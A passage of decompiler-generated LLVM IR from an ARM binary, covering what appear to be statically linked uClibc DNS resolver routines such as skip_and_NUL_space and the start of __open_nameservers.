  %v1_1dab8 = add i32 %v0_1dab8, 16
  %v2_1dab8 = inttoptr i32 %v1_1dab8 to i32*
  %v3_1dab8 = load i32, i32* %v2_1dab8, align 4
  store i32 %v3_1dab8, i32* %r1.global-to-local, align 4
  store i32 %v5_1d984, i32* %r3.global-to-local, align 4
  %v3_1dac0 = icmp uge i32 %v3_1dab8, %v5_1d984
  store i1 %v3_1dac0, i1* %cpsr_c.global-to-local, align 1
  %v9_1dac0 = icmp eq i32 %v3_1dab8, %v5_1d984
  br i1 %v9_1dac0, label %dec_label_pc_1dad4, label %dec_label_pc_1dac8

dec_label_pc_1dac8:                               ; preds = %dec_label_pc_1dab8
  %v1_1dac8 = inttoptr i32 %v0_1dab8 to i32*
  %v2_1dac8 = load i32, i32* %v1_1dac8, align 4
  store i32 %v2_1dac8, i32* @r0, align 4
  %v0_1dacc = call i32 @free()
  br label %dec_label_pc_1db48

dec_label_pc_1dad4:                               ; preds = %dec_label_pc_1dab8
  %v1_1dad4 = add i32 %v0_1dab8, 36
  %v2_1dad4 = inttoptr i32 %v1_1dad4 to i32*
  %v3_1dad4 = load i32, i32* %v2_1dad4, align 4
  %v1_1dad8 = add i32 %v0_1dab8, 28
  %v2_1dad8 = inttoptr i32 %v1_1dad8 to i32*
  %v3_1dad8 = load i32, i32* %v2_1dad8, align 4
  store i32 %v3_1dad8, i32* @r3, align 4
  %v3_1dadc = mul i32 %v3_1dad4, %v5_1d984
  %v4_1dadc = add i32 %v3_1dad8, %v3_1dadc
  store i32 %v4_1dadc, i32* @r0, align 4
  store i32 %v5_1d984, i32* @r2, align 4
  store i32 %v1_1d9a4, i32* @r1, align 4
  %v0_1dae8 = call i32 @memcpy()
  %v0_1daec = load i32, i32* @fp, align 4
  %v1_1daec = add i32 %v0_1daec, 36
  %v2_1daec = inttoptr i32 %v1_1daec to i32*
  %v3_1daec = load i32, i32* %v2_1daec, align 4
  %v1_1daf0 = add i32 %v3_1daec, 1
  store i32 %v1_1daf0, i32* %r3.global-to-local, align 4
  store i32 %v1_1daf0, i32* %v2_1daec, align 4
  br label %dec_label_pc_1daf8

dec_label_pc_1daf8:                               ; preds = %bb228, %dec_label_pc_1daa0, %dec_label_pc_1da90, %dec_label_pc_1dad4
  %stack_var_-480.1 = phi i32 [ 0, %dec_label_pc_1dad4 ], [ 0, %dec_label_pc_1daa0 ], [ 0, %dec_label_pc_1da90 ], [ 1, %bb228 ]
  %v1_1db00 = load i32, i32* @r4, align 4
  %v1_1db04 = add nuw nsw i32 %stack_var_-452.061, 1
  store i32 %v1_1db04, i32* %r1.global-to-local, align 4
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  %v3_1db18 = icmp uge i32 %v1_1db04, %tmp159
  store i1 %v3_1db18, i1* %cpsr_c.global-to-local, align 1
  %v5_1db1c = icmp slt i32 %v1_1db04, %tmp159
  br i1 %v5_1db1c, label %dec_label_pc_1daf8.dec_label_pc_1d8f0_crit_edge, label %dec_label_pc_1db20

dec_label_pc_1daf8.dec_label_pc_1d8f0_crit_edge:  ; preds = %dec_label_pc_1daf8
  %v2_1db00 = add i32 %v1_1db00, %stack_var_-460.364
  %v0_1d8f4.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_1d8f0

dec_label_pc_1db20:                               ; preds = %dec_label_pc_1d9e8, %dec_label_pc_1d8cc, %dec_label_pc_1daf8, %dec_label_pc_1da34, %dec_label_pc_1da64, %bb227
  %v1_1db24 = call i32 @__GI_close(i32 %v3_1d6f8)
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1db2c = icmp eq i32 %arg3, 0
  br i1 %v2_1db2c, label %.thread21, label %bb230

bb230:                                            ; preds = %dec_label_pc_1db20
  %v1_1db34 = load i32, i32* @sl, align 4
  %v3_1db30 = inttoptr i32 %arg3 to i32*
  store i32 %v1_1db34, i32* %v3_1db30, align 4
  br label %bb231

.thread21:                                        ; preds = %dec_label_pc_1db20
  br label %bb231

bb231:                                            ; preds = %bb230, %.thread21
  store i32 ptrtoint (i32* @global_var_1db3c.1682 to i32), i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1db2c, i32 ptrtoint (i32* @global_var_17278.1556 to i32))
  store i32 %v1_1d470, i32* @r0, align 4
  %v0_1db40 = call i32 @free()
  br label %dec_label_pc_1dbb0

dec_label_pc_1db48:                               ; preds = %thread-pre-split, %dec_label_pc_1d744, %dec_label_pc_1d8a4, %dec_label_pc_1d89c, %dec_label_pc_1d84c, %dec_label_pc_1d858, %dec_label_pc_1d864thread-pre-split, %thread-pre-split.thread, %dec_label_pc_1d81c, %dec_label_pc_1d9e8, %dec_label_pc_1d9dc, %dec_label_pc_1d708, %dec_label_pc_1d6e8, %dec_label_pc_1dac8
  %v1_1db4c = add i32 %v0_1d60c, 1
  store i32 %v1_1db4c, i32* @r5, align 4
  br label %dec_label_pc_1db58

dec_label_pc_1db58:                               ; preds = %.thread7, %dec_label_pc_1db48
  %storemerge22 = phi i32 [ -1, %dec_label_pc_1db48 ], [ %v7_1d808, %.thread7 ]
  %stack_var_-468.2 = phi i32 [ %v1_1db4c, %dec_label_pc_1db48 ], [ %v0_1d60c, %.thread7 ]
  store i32 %storemerge22, i32* @sb, align 4
  %v1_1db5c = add i32 %stack_var_-476.1, -1
  store i32 %v1_1db5c, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp232 = icmp slt i32 %v1_1db5c, 1
  br i1 %tmp232, label %dec_label_pc_1db78, label %dec_label_pc_1d510

dec_label_pc_1db70:                               ; preds = %dec_label_pc_1d6bc, %bb218, %bb213, %.thread5, %dec_label_pc_1d48c
  store i32 -1, i32* @ip, align 4
  br label %dec_label_pc_1db78

dec_label_pc_1db78:                               ; preds = %dec_label_pc_1db58, %.thread132, %dec_label_pc_1db70
  %stack_var_-472.1 = phi i32 [ %v1_1d470, %dec_label_pc_1db70 ], [ 0, %.thread132 ], [ %v1_1d470, %dec_label_pc_1db58 ]
  %stack_var_-488.2 = phi i32 [ -1, %dec_label_pc_1db70 ], [ -1, %.thread132 ], [ %v3_1d6f8, %dec_label_pc_1db58 ]
  %v0_1db78 = call i32 @__GI___h_errno_location()
  store i32 %stack_var_-488.2, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_1db84 = icmp eq i32 %stack_var_-488.2, -1
  store i1 %v2_1db84, i1* %cpsr_c.global-to-local, align 1
  %v7_1db84 = icmp eq i32 %stack_var_-488.2, -1
  %v2_1db88 = inttoptr i32 %v0_1db78 to i32*
  store i32 -1, i32* %v2_1db88, align 4
  br i1 %v7_1db84, label %dec_label_pc_1db98, label %dec_label_pc_1db90

dec_label_pc_1db90:                               ; preds = %dec_label_pc_1db78, %dec_label_pc_1d844
  %stack_var_-472.2 = phi i32 [ %stack_var_-472.1, %dec_label_pc_1db78 ], [ %v1_1d470, %dec_label_pc_1d844 ]
  %stack_var_-488.3 = phi i32 [ %stack_var_-488.2, %dec_label_pc_1db78 ], [ %v3_1d6f8, %dec_label_pc_1d844 ]
  %v1_1db94 = call i32 @__GI_close(i32 %stack_var_-488.3)
  br label %dec_label_pc_1db98

dec_label_pc_1db98:                               ; preds = %dec_label_pc_1db78, %dec_label_pc_1db90
  %stack_var_-472.3 = phi i32 [ %stack_var_-472.1, %dec_label_pc_1db78 ], [ %stack_var_-472.2, %dec_label_pc_1db90 ]
  store i32 %stack_var_-472.3, i32* @r0, align 4
  %v0_1db9c = call i32 @free()
  %v0_1dba0 = load i32, i32* @sl, align 4
  store i32 %v0_1dba0, i32* @r0, align 4
  %v0_1dba4 = call i32 @free()
  br label %dec_label_pc_1dbb0

dec_label_pc_1dbb0:                               ; preds = %bb231, %dec_label_pc_1db98
  %stack_var_-484.0 = phi i32 [ -1, %dec_label_pc_1db98 ], [ %v5_1d780, %bb231 ]
  store i32 %v3_1d414, i32* @r4, align 4
  store i32 %v6_1d414, i32* @r5, align 4
  store i32 %v9_1d414, i32* @r6, align 4
  store i32 %v12_1d414, i32* @r7, align 4
  store i32 %v15_1d414, i32* @r8, align 4
  store i32 %v18_1d414, i32* @sb, align 4
  store i32 %v21_1d414, i32* @sl, align 4
  store i32 %v24_1d414, i32* @fp, align 4
  store i32 %v27_1d414, i32* @lr, align 4
  ret i32 %stack_var_-484.0

; uselistorder directives
  uselistorder i32 %stack_var_-488.2, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-472.1, { 1, 0 }
  uselistorder i32 %v1_1db5c, { 1, 2, 0 }
  uselistorder i32 %v1_1db04, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1dab8, { 2, 1, 0, 3 }
  uselistorder i32 %v1_1da74, { 1, 0, 2 }
  uselistorder i32 %v2_1d9ac, { 1, 0 }
  uselistorder i32 %v5_1d984, { 5, 0, 2, 3, 4, 1, 7, 6, 8 }
  uselistorder i32 %v2_1d944, { 3, 4, 0, 5, 6, 1, 2, 7, 8, 9, 10 }
  uselistorder i32 %v2_1d940, { 1, 0 }
  uselistorder i32 %v2_1d924, { 0, 3, 2, 4, 1, 5, 6 }
  uselistorder i32 %v2_1d920, { 1, 0 }
  uselistorder i32 %v1_1d91c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-452.061, { 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-460.364, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32 %v0_1d89c, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v2_1d878, { 1, 0 }
  uselistorder i32 %v3_1d86c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1d86c, { 0, 2, 1 }
  uselistorder i32 %v2_1d85c, { 0, 2, 1 }
  uselistorder i1 %v7_1d790, { 1, 0 }
  uselistorder i32 %v1_1d790, { 1, 0 }
  uselistorder i32 %v0_1d790, { 1, 0 }
  uselistorder i32 %v5_1d780, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v3_1d6f8, { 1, 0, 2, 9, 7, 6, 5, 8, 4, 10, 11, 3 }
  uselistorder i32 %v6_1d6b0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1d63c, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v3_1d624, { 4, 5, 6, 7, 0, 1, 2, 3 }
  uselistorder i32 %v1_1d618, { 1, 0 }
  uselistorder i32 %v0_1d60c, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-464.1, { 1, 0 }
  uselistorder i32 %v0_1d5c4, { 1, 0, 2, 3, 4 }
  uselistorder i1 %v7_1d514, { 1, 0 }
  uselistorder i32 %v1_1d518, { 0, 2, 1 }
  uselistorder i32 %stack_var_-468.0, { 0, 2, 1 }
  uselistorder i32 %v2_1d8d4, { 1, 0, 2 }
  uselistorder i32 %v1_1d7e4, { 2, 0, 1 }
  uselistorder i32 %v2_1d66c, { 1, 0, 2 }
  uselistorder i32 %v2_1d644, { 1, 0 }
  uselistorder i32 %v0_1d48c, { 1, 0, 2 }
  uselistorder i32 %v1_1d470, { 7, 0, 3, 6, 4, 8, 1, 9, 2, 5, 10, 11 }
  uselistorder i32 %v3_1d43c, { 5, 1, 3, 2, 4, 0, 6 }
  uselistorder i32 %v0_1d428, { 10, 9, 8, 7, 6, 5, 2, 11, 0, 1, 4, 3 }
  uselistorder i16* %stack_var_-104, { 2, 1, 0 }
  uselistorder i32* %stack_var_-192, { 2, 0, 3, 1, 4 }
  uselistorder i32 %tmp159, { 3, 8, 7, 0, 6, 2, 4, 1, 5 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 17, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 53, 18, 19, 52, 54, 20, 21, 22, 23, 24, 25, 26, 48, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 49, 50, 51, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 36, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 28, 24, 25, 26, 27, 29, 30, 31, 32, 33, 34, 35, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 3, 4, 21, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 1, 19, 20, 55, 22, 23, 24, 25, 26, 54, 27, 28, 29, 30, 31, 32, 33, 34, 35, 0, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32 (i32)* @__GI_close, { 15, 14, 16, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 13, 12, 17, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 23, { 2, 0, 1, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__decode_dotted, { 1, 0 }
  uselistorder i32 -3, { 2, 0, 1, 3, 4 }
  uselistorder i32 192, { 0, 3, 1, 4, 2 }
  uselistorder i32 ()* @__GI___h_errno_location, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_recv, { 1, 4, 3, 2, 0 }
  uselistorder i32 64, { 1, 15, 0, 12, 16, 10, 4, 5, 6, 7, 13, 14, 2, 3, 11, 17, 8, 18, 9 }
  uselistorder i32 1000, { 3, 2, 4, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 2, 6, 1, 11, 10, 9, 8, 7, 5, 4, 3, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 1, 7, 6, 5, 4, 0, 3, 8, 2 }
  uselistorder i32 (i32, i32, i32)* @socket, { 3, 11, 10, 9, 8, 7, 6, 2, 1, 0, 5, 4, 12 }
  uselistorder i32 17, { 1, 17, 2, 11, 3, 12, 4, 13, 5, 14, 0, 16, 18, 6, 7, 9, 8, 10, 15 }
  uselistorder i32 80, { 0, 4, 15, 16, 17, 5, 1, 6, 7, 8, 10, 9, 19, 11, 12, 13, 14, 20, 2, 3, 18 }
  uselistorder i32 27, { 2, 1, 0, 3 }
  uselistorder i8 46, { 3, 2, 0, 4, 1, 5 }
  uselistorder i8 45, { 3, 1, 4, 2, 0, 5, 6, 7 }
  uselistorder i32 26360, { 2, 0, 1, 3 }
  uselistorder i32 130, { 1, 0 }
  uselistorder i32 512, { 3, 5, 2, 6, 1, 7, 8, 9, 10, 4, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1dbb0, { 1, 0 }
  uselistorder label %dec_label_pc_1db98, { 1, 0 }
  uselistorder label %dec_label_pc_1db78, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1db70, { 0, 1, 4, 2, 3 }
  uselistorder label %dec_label_pc_1db58, { 1, 0 }
  uselistorder label %dec_label_pc_1db48, { 13, 9, 10, 2, 3, 6, 5, 4, 8, 0, 7, 1, 11, 12 }
  uselistorder label %bb231, { 1, 0 }
  uselistorder label %dec_label_pc_1db20, { 2, 4, 5, 3, 0, 1 }
  uselistorder label %dec_label_pc_1daf8, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1da50, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1d9dc, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1d8f0, { 1, 0 }
  uselistorder label %dec_label_pc_1d89c, { 1, 0 }
  uselistorder label %dec_label_pc_1d86c, { 1, 0 }
  uselistorder label %dec_label_pc_1d844, { 1, 0 }
  uselistorder label %dec_label_pc_1d790, { 1, 0, 2 }
  uselistorder label %bb218, { 1, 0 }
  uselistorder label %dec_label_pc_1d5ec, { 1, 0 }
  uselistorder label %dec_label_pc_1d5b0, { 1, 0 }
  uselistorder label %bb216, { 1, 0 }
}

define i32 @"$d"(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1dbc0:
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_1dbc0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1dbc0, label %bb, label %.thread13

bb:                                               ; preds = %dec_label_pc_1dbc0
  %v2_1dbc8 = load i32, i32* @r8, align 4
  %v2_1dbd4 = load i32, i32* @r4, align 4
  %v3_1dbe0 = mul i32 %v2_1dbd4, %v2_1dbc8
  %v4_1dbe4 = inttoptr i32 %v3_1dbe0 to i32*
  store i32 0, i32* %v4_1dbe4, align 4
  %v2_1dbe8 = load i32, i32* @r4, align 4
  %v1_1dbf8 = load i32, i32* @sl, align 4
  %v3_1dbf8 = mul i32 %v1_1dbf8, %v2_1dbe8
  br label %.thread13

.thread13:                                        ; preds = %dec_label_pc_1dbc0, %bb
  %v4_1dbf8 = phi i32 [ %tmp, %dec_label_pc_1dbc0 ], [ %v3_1dbf8, %bb ]
  ret i32 %v4_1dbf8

; uselistorder directives
  uselistorder label %.thread13, { 1, 0 }
}

define i32 @skip_nospace() local_unnamed_addr {
entry:
  store i32 580, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @ip, align 4
  call void @llvm.trap()
  unreachable
}

define i32 @skip_and_NUL_space(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1dc54 = load i32, i32* @r4, align 4
  store i32 %v3_1dc54, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @ip, align 4
  store i32 580, i32* %r4.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_1dc64.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_1dc649 = inttoptr i32 %v0_1dc64.pre to i8*
  %v2_1dc6410 = load i8, i8* %v1_1dc649, align 1
  %v2_1dc6812 = icmp eq i8 %v2_1dc6410, 0
  store i1 %v2_1dc6812, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1dc6812, label %dec_label_pc_1dc98, label %dec_label_pc_1dc74

dec_label_pc_1dc74:                               ; preds = %entry, %bb8.dec_label_pc_1dc74_crit_edge
  %v1_1dc74 = phi i32 [ %v1_1dc74.pre, %bb8.dec_label_pc_1dc74_crit_edge ], [ 580, %entry ]
  %v0_1dc74 = phi i32 [ %v0_1dc74.pre, %bb8.dec_label_pc_1dc74_crit_edge ], [ ptrtoint (i32* @global_var_2e024.1314 to i32), %entry ]
  %v2_1dc6416 = phi i8 [ %v2_1dc64, %bb8.dec_label_pc_1dc74_crit_edge ], [ %v2_1dc6410, %entry ]
  %v2_1dc6c17.in.in = phi i8 [ %v2_1dc64, %bb8.dec_label_pc_1dc74_crit_edge ], [ %v2_1dc6410, %entry ]
  %v1_1dc6415 = phi i8* [ %v1_1dc64, %bb8.dec_label_pc_1dc74_crit_edge ], [ %v1_1dc649, %entry ]
  %v2_1dc8c14 = phi i32 [ %v2_1dc90, %bb8.dec_label_pc_1dc74_crit_edge ], [ %v0_1dc64.pre, %entry ]
  %v2_1dc6c17.in = zext i8 %v2_1dc6c17.in.in to i32
  %v2_1dc6c17 = mul nuw nsw i32 %v2_1dc6c17.in, 2
  %v2_1dc74 = add i32 %v1_1dc74, %v0_1dc74
  %v3_1dc74 = inttoptr i32 %v2_1dc74 to i32*
  %v4_1dc74 = load i32, i32* %v3_1dc74, align 4
  %v2_1dc78 = add i32 %v4_1dc74, %v2_1dc6c17
  %v3_1dc78 = inttoptr i32 %v2_1dc78 to i16*
  %v4_1dc78 = load i16, i16* %v3_1dc78, align 2
  %v1_1dc7c = and i16 %v4_1dc78, 32
  %v2_1dc7c = icmp eq i16 %v1_1dc7c, 0
  store i1 %v2_1dc7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1dc7c, label %dec_label_pc_1dc98, label %dec_label_pc_1dc84

dec_label_pc_1dc84:                               ; preds = %dec_label_pc_1dc74
  %v7_1dc84 = icmp eq i8 %v2_1dc6416, 35
  br i1 %v7_1dc84, label %bb7, label %bb

bb:                                               ; preds = %dec_label_pc_1dc84
  %v8_1dc88 = icmp eq i8 %v2_1dc6416, 10
  br label %bb7

bb7:                                              ; preds = %dec_label_pc_1dc84, %bb
  %storemerge = phi i1 [ %v8_1dc88, %bb ], [ %v7_1dc84, %dec_label_pc_1dc84 ]
  store i1 %storemerge, i1* %cpsr_z.global-to-local, align 1
  %v0_1dc8c = load i32, i32* %lr.global-to-local, align 4
  %v1_1dc8c = trunc i32 %v0_1dc8c to i8
  store i8 %v1_1dc8c, i8* %v1_1dc6415, align 1
  %v0_1dc90 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_1dc9c.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_1dc90, label %dec_label_pc_1dc98, label %bb8

bb8:                                              ; preds = %bb7
  %v2_1dc90 = add i32 %v1_1dc9c.pre, 1
  store i32 %v2_1dc90, i32* %r0.global-to-local, align 4
  %v1_1dc64 = inttoptr i32 %v2_1dc90 to i8*
  %v2_1dc64 = load i8, i8* %v1_1dc64, align 1
  %v2_1dc68 = icmp eq i8 %v2_1dc64, 0
  store i1 %v2_1dc68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1dc68, label %dec_label_pc_1dc98, label %bb8.dec_label_pc_1dc74_crit_edge

bb8.dec_label_pc_1dc74_crit_edge:                 ; preds = %bb8
  %v0_1dc74.pre = load i32, i32* @ip, align 4
  %v1_1dc74.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1dc74

dec_label_pc_1dc98:                               ; preds = %bb8, %dec_label_pc_1dc74, %bb7, %entry
  %v1_1dc9c = phi i32 [ %v0_1dc64.pre, %entry ], [ %v1_1dc9c.pre, %bb7 ], [ %v2_1dc8c14, %dec_label_pc_1dc74 ], [ %v2_1dc90, %bb8 ]
  %v2_1dc98 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1dc98, i32* @r4, align 4
  ret i32 %v1_1dc9c

; uselistorder directives
  uselistorder i8 %v2_1dc64, { 2, 1, 0 }
  uselistorder i8* %v1_1dc64, { 1, 0 }
  uselistorder i32 %v2_1dc90, { 0, 2, 3, 1 }
  uselistorder i1 %v2_1dc7c, { 1, 0 }
  uselistorder i8 %v2_1dc6416, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 2, 0, 3, 1 }
  uselistorder i16 0, { 0, 7, 1, 2, 8, 3, 4, 5, 6, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32 580, { 0, 3, 4, 5, 2, 1, 6, 7 }
  uselistorder label %dec_label_pc_1dc98, { 0, 2, 1, 3 }
  uselistorder label %bb7, { 1, 0 }
  uselistorder label %dec_label_pc_1dc74, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-544 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-68 = alloca i16, align 2
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-560 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1dca8 = load i32, i32* @r4, align 4
  store i32 %v3_1dca8, i32* %stack_var_-36, align 4
  %v15_1dca8 = load i32, i32* @r8, align 4
  %v18_1dca8 = load i32, i32* @sb, align 4
  %v21_1dca8 = load i32, i32* @sl, align 4
  %v24_1dca8 = load i32, i32* @fp, align 4
  %v27_1dca8 = load i32, i32* @lr, align 4
  store i32 27392, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @r5, align 4
  %v4_1dcb8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 27392) to i32*), align 4
  store i32 %v4_1dcb8, i32* @r4, align 4
  %v2_1dcbc = icmp eq i32 %v4_1dcb8, 0
  br i1 %v2_1dcbc, label %dec_label_pc_1dcc8, label %dec_label_pc_1dcf8

dec_label_pc_1dcc8:                               ; preds = %entry
  %v2_1dccc = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_1dccc, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -33356), i32* %r0.global-to-local, align 4
  %v2_1dcd4 = call i32 @__GI_stat(i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -33356), i32 %v2_1dccc)
  store i32 %v2_1dcd4, i32* %r0.global-to-local, align 4
  %v2_1dcd8 = icmp eq i32 %v2_1dcd4, 0
  %v1_1dcdc = load i32, i32* @r4, align 4
  %.v1_1dcdc = select i1 %v2_1dcd8, i32 %tmp38, i32 %v1_1dcdc
  store i32 26388, i32* %r1.global-to-local, align 4
  store i32 %.v1_1dcdc, i32* %r2.global-to-local, align 4
  %v0_1dce8 = load i32, i32* @r5, align 4
  %v2_1dce8 = add i32 %v0_1dce8, 26388
  %v3_1dce8 = inttoptr i32 %v2_1dce8 to i32*
  %v4_1dce8 = load i32, i32* %v3_1dce8, align 4
  store i32 %v4_1dce8, i32* %r3.global-to-local, align 4
  %v9_1dcec = icmp eq i32 %v4_1dce8, %.v1_1dcdc
  br i1 %v9_1dcec, label %bb58, label %bb

bb:                                               ; preds = %dec_label_pc_1dcc8
  store i32 %.v1_1dcdc, i32* %v3_1dce8, align 4
  br label %bb58

bb58:                                             ; preds = %dec_label_pc_1dcc8, %bb
  store i32 122104, i32* @lr, align 4
  %v1_1dcf4 = xor i1 %v9_1dcec, true
  call void @__pseudo_cond_branch(i1 %v1_1dcf4, i32 ptrtoint (i32* @global_var_1e104.1691 to i32))
  %v0_1dcfc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1dcf8

dec_label_pc_1dcf8:                               ; preds = %entry, %bb58
  %v2_1dd10 = phi i32 [ ptrtoint (i32* @global_var_2e024.1314 to i32), %entry ], [ %v0_1dcfc.pre, %bb58 ]
  store i32 27404, i32* %r3.global-to-local, align 4
  %v2_1dcfc = add i32 %v2_1dd10, 27404
  %v3_1dcfc = inttoptr i32 %v2_1dcfc to i32*
  %v4_1dcfc = load i32, i32* %v3_1dcfc, align 4
  store i32 %v4_1dcfc, i32* %r3.global-to-local, align 4
  %v2_1dd00 = icmp eq i32 %v4_1dcfc, 0
  br i1 %v2_1dd00, label %dec_label_pc_1dd08, label %dec_label_pc_1e09c

dec_label_pc_1dd08:                               ; preds = %dec_label_pc_1dcf8
  %v4_1dd10 = add i32 %v2_1dd10, 1178
  %v5_1dd10 = inttoptr i32 %v4_1dd10 to i8*
  store i8 5, i8* %v5_1dd10, align 1
  store i32 -33356, i32* %r0.global-to-local, align 4
  store i32 1179, i32* %r3.global-to-local, align 4
  store i32 -34332, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v3_1dd24 = load i32, i32* @r5, align 4
  %v5_1dd24 = add i32 %v3_1dd24, 1179
  %v6_1dd24 = inttoptr i32 %v5_1dd24 to i8*
  store i8 3, i8* %v6_1dd24, align 1
  %v0_1dd28 = load i32, i32* @r5, align 4
  %v1_1dd28 = load i32, i32* %r0.global-to-local, align 4
  %v2_1dd28 = add i32 %v1_1dd28, %v0_1dd28
  store i32 %v2_1dd28, i32* @r0, align 4
  %v1_1dd2c = load i32, i32* %r1.global-to-local, align 4
  %v2_1dd2c = add i32 %v1_1dd2c, %v0_1dd28
  store i32 %v2_1dd2c, i32* @r1, align 4
  %v5_1dd30 = call i32 @__GI_fopen(i32 %v2_1dd28, i32 %v2_1dd2c, i32 3, i32 1179)
  store i32 %v5_1dd30, i32* %r0.global-to-local, align 4
  store i32 %v5_1dd30, i32* @fp, align 4
  %v2_1dd34 = icmp eq i32 %v5_1dd30, 0
  br i1 %v2_1dd34, label %dec_label_pc_1dfc0, label %dec_label_pc_1df68

dec_label_pc_1dd40:                               ; preds = %dec_label_pc_1df68, %dec_label_pc_1df9c.backedge
  store i32 %v2_1df9c, i32* %r0.global-to-local, align 4
  %v2_1dd44 = call i32 @skip_and_NUL_space(i8* %v1_1dd44)
  store i32 %v2_1dd44, i32* %r0.global-to-local, align 4
  store i32 %v2_1dd44, i32* @r4, align 4
  %v0_1dd4c = call i32 @skip_nospace()
  store i32 %v0_1dd4c, i32* %r0.global-to-local, align 4
  %v1_1dd50 = inttoptr i32 %v0_1dd4c to i8*
  %v2_1dd50 = call i32 @skip_and_NUL_space(i8* %v1_1dd50)
  store i32 %v2_1df6c, i32* @r1, align 4
  store i32 %v2_1dd50, i32* @r7, align 4
  %v0_1dd5c = load i32, i32* @r4, align 4
  store i32 %v0_1dd5c, i32* %r0.global-to-local, align 4
  %v2_1dd60 = inttoptr i32 %v0_1dd5c to i8*
  %v3_1dd60 = call i32 @__GI_strcoll(i8* %v2_1dd60, i32 %v2_1df6c)
  store i32 %v3_1dd60, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v3_1dd60, 16777216
  %v1_1dd64 = sdiv i32 %sext, 16777216
  store i32 %v1_1dd64, i32* @r6, align 4
